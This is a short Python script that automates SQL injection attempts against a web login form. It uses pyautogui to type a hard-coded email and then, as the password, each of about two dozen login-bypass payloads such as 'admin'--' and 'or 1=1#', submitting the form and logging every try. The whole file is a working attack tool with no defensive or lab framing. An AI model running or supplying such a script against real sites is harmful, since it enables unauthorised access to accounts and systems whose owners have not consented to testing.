import pyautogui
import time
# List of SQL Injection payloads
payloads = [
    "1' or 1'='1", "or 1=1--", "or 1=1#", "or 1=1", "\"or\"\"=\"", "or 1=1--", "or 1=1#", "or 1=1/*", "admin'--", "admin'#", "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin' or 1=1 or \"=\"", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", "admin') or 1=1--", "admin') or 1=1/*", "admin') or 1=1#"
]
#Focus the cursor on the username field within 10 seconds....
time.sleep(10)
for payload in payloads:
    #for userid or name field
    # pyautogui.write(payload, interval=0.05)
    #for user e-mail field
    pyautogui.write("admin@site.com", interval=0.05)
    pyautogui.press("tab")
    pyautogui.write(payload, interval=0.05)
    pyautogui.press("enter")
    
    print(f"[+] Tried payload: {payload}")
    time.sleep(5)
    #click the 1st input field after returning the same login page to clear the field
    #clear 1st input field
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')
    pyautogui.press('tab')
    #clear 2nd input field
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')
    #again click the 1st input field instant
    time.sleep(2)

print("✅ All Done.")